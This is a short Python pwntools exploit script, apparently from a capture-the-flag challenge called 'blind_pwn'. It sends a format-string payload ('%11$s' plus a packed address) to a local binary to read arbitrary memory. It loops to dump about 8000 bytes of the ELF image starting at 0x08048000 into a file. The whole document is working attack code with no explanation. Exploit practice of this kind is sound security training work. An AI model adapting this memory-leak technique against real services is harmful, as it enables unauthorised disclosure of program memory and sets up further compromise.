#!/usr/bin/env python

from pwn import *


def leakELF(addr):
    p = None
    payload = ""
    for i in range(5):
        try:
            p = process('./blind_pwn')
            payload = "ABCD%11$sDCBAaaa" + p32(addr)
            if ("\x0a" in payload) or ("\x00" in payload):
                log.warning("newline in payload")
                return "\xff"
            
            print p.recvuntil("Welcome to blind pwn!\n")
            p.sendline(payload)
            data = p.recvline()
            log.info(hexdump(data))
            if data:
                fr = data.find("ABCD")
                to = data.find("DCBAaaa")
                res = data[fr+4:to]
                print res
                if res == "":
                    return "\x00"
                else:
                    return res
            return "\xff"

        except KeyboardInterrupt:
            raise
        except EOFError:
            log.debug("got EOF for leaking addr 0x{:x}".format(addr))
            pass
        except Exception:
            log.warning("got exception...", exc_info=sys.exc_info())
        finally:
            if p:
                p.close()
	return "\xff"

f = open("dump", "wb")
base = 0x08048000
leaked = ""
while len(leaked) < 8000:
    addr = base + len(leaked)
    tmp = leakELF(addr)
    leaked += tmp
    log.info(hexdump(leaked))
    with open("dump", "wb") as f:
        f.write(leaked)
